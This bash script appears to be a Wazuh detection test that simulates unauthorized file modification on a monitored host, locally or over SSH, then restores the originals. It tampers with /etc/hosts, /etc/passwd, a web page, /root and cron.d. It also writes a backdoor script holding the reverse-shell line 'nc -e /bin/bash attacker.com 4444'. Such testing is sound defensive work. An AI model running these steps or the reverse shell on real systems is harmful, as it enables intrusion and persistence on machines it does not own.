#!/bin/bash
#===============================================================================
# Attack #03: Unauthorized File Modification
# Category: File Integrity
# Expected Wazuh Rules: 550 (lvl7), 553 (lvl7), 554 (lvl5)
# Expected Level: 5-7
# MITRE ATT&CK: T1565.001 (Data Manipulation: Stored Data Manipulation)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="03"
ATTACK_NAME="Unauthorized File Modification"
ATTACK_CATEGORY="File Integrity"

TARGET="${1:-$TARGET_IP}"
MODE="${2:-ssh}" # ssh | local
SSH_USER="${TARGET_USER:-ubuntu}"
SSH_KEY_RAW="${SSH_KEY_OVERRIDE:-${TARGET_SSH_KEY:-$HOME/.ssh/wazuh-agent.pem}}"
SSH_KEY="${SSH_KEY_RAW/#\~/$HOME}"

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: $TARGET"
echo "Mode: $MODE"
echo "Category: $ATTACK_CATEGORY"
echo ""
echo -e "${RED}NOTE: This attack must run on the target agent (FIM)${NC}"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo ""

run_payload() {
    echo "[*] Creating test files in monitored directories..."
    BACKUP_DIR="/tmp/fim_backup_$(date +%s)"
    mkdir -p "$BACKUP_DIR"

    echo "[*] Modifying /etc/hosts"
    sudo cp /etc/hosts "$BACKUP_DIR/" 2>/dev/null
    echo "# Malicious entry added by attacker" | sudo tee -a /etc/hosts >/dev/null
    echo "139.162.182.178 evil-server.com" | sudo tee -a /etc/hosts >/dev/null

    echo "[*] Attempting to modify /etc/passwd"
    sudo cp /etc/passwd "$BACKUP_DIR/" 2>/dev/null
    echo "# Unauthorized modification test" | sudo tee -a /etc/passwd >/dev/null 2>&1 || echo "    Cannot modify /etc/passwd directly"

    echo "[*] Creating suspicious files in /tmp"
    echo "malicious content" > /tmp/suspicious_file.txt
    echo "#!/bin/bash" > /tmp/backdoor.sh
    echo "nc -e /bin/bash attacker.com 4444" >> /tmp/backdoor.sh
    chmod +x /tmp/backdoor.sh

    if [ -d "/var/www/html" ]; then
        echo "[*] Modifying web directory"
        echo "<!-- Defaced by attacker -->" | sudo tee -a /var/www/html/index.html >/dev/null 2>&1
    fi

    echo "[*] Attempting to create file in /root"
    echo "backdoor" | sudo tee /root/.backdoor 2>/dev/null || echo "    Cannot write to /root"

    echo "[*] Creating file in cron directory"
    echo "# Malicious cron job" | sudo tee /etc/cron.d/malicious_job 2>/dev/null || echo "    Cannot write to cron.d"

    echo ""
    echo "[*] Modifications complete. Wazuh FIM should detect these changes."
    echo "[*] Cleaning up test files (restoring originals)..."
    sleep 5

    sudo cp "$BACKUP_DIR/hosts" /etc/hosts 2>/dev/null
    sudo cp "$BACKUP_DIR/passwd" /etc/passwd 2>/dev/null
    rm -f /tmp/suspicious_file.txt /tmp/backdoor.sh
    sudo rm -f /root/.backdoor 2>/dev/null
    sudo rm -f /etc/cron.d/malicious_job 2>/dev/null
    echo "[*] Cleanup complete"
}

if [ "$MODE" = "local" ] || [ "$TARGET" = "localhost" ] || [ "$TARGET" = "127.0.0.1" ]; then
    echo "[*] Running attack locally on agent"
    run_payload
elif [ "$MODE" = "ssh" ] && [ -n "$SSH_KEY" ] && [ -f "$SSH_KEY" ]; then
    echo "[*] Running attack via SSH to $SSH_USER@$TARGET"

    ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$SSH_USER@$TARGET" "bash -s" <<'EOF'
run_payload() {
    echo "[*] Creating test files in monitored directories..."
    BACKUP_DIR="/tmp/fim_backup_$(date +%s)"
    mkdir -p "$BACKUP_DIR"

    echo "[*] Modifying /etc/hosts"
    sudo cp /etc/hosts "$BACKUP_DIR/" 2>/dev/null
    echo "# Malicious entry added by attacker" | sudo tee -a /etc/hosts >/dev/null
    echo "139.162.182.178 evil-server.com" | sudo tee -a /etc/hosts >/dev/null

    echo "[*] Attempting to modify /etc/passwd"
    sudo cp /etc/passwd "$BACKUP_DIR/" 2>/dev/null
    echo "# Unauthorized modification test" | sudo tee -a /etc/passwd >/dev/null 2>&1 || echo "    Cannot modify /etc/passwd directly"

    echo "[*] Creating suspicious files in /tmp"
    echo "malicious content" > /tmp/suspicious_file.txt
    echo "#!/bin/bash" > /tmp/backdoor.sh
    echo "nc -e /bin/bash attacker.com 4444" >> /tmp/backdoor.sh
    chmod +x /tmp/backdoor.sh

    if [ -d "/var/www/html" ]; then
        echo "[*] Modifying web directory"
        echo "<!-- Defaced by attacker -->" | sudo tee -a /var/www/html/index.html >/dev/null 2>&1
    fi

    echo "[*] Attempting to create file in /root"
    echo "backdoor" | sudo tee /root/.backdoor 2>/dev/null || echo "    Cannot write to /root"

    echo "[*] Creating file in cron directory"
    echo "# Malicious cron job" | sudo tee /etc/cron.d/malicious_job 2>/dev/null || echo "    Cannot write to cron.d"

    echo ""
    echo "[*] Modifications complete. Wazuh FIM should detect these changes."
    echo "[*] Cleaning up test files (restoring originals)..."
    sleep 5

    sudo cp "$BACKUP_DIR/hosts" /etc/hosts 2>/dev/null
    sudo cp "$BACKUP_DIR/passwd" /etc/passwd 2>/dev/null
    rm -f /tmp/suspicious_file.txt /tmp/backdoor.sh
    sudo rm -f /root/.backdoor 2>/dev/null
    sudo rm -f /etc/cron.d/malicious_job 2>/dev/null
    echo "[*] Cleanup complete"
}

run_payload
EOF
else
    echo -e "${YELLOW}[!] MODE=ssh but no key found; aborting${NC}"
    exit 1
fi

END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack completed${NC}"
echo "==============================================================================="
echo "End Time: $END_TIMESTAMP"
echo "Duration: ${DURATION} seconds"
echo ""
echo "Expected Wazuh alerts (observed):"
echo "  - Rule 550 (lvl7): File modified"
echo "  - Rule 553 (lvl7): File deleted"
echo "  - Rule 554 (lvl5): File added"
echo "  - FIM on /etc/hosts, /etc/passwd, /var/www/html, cron"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
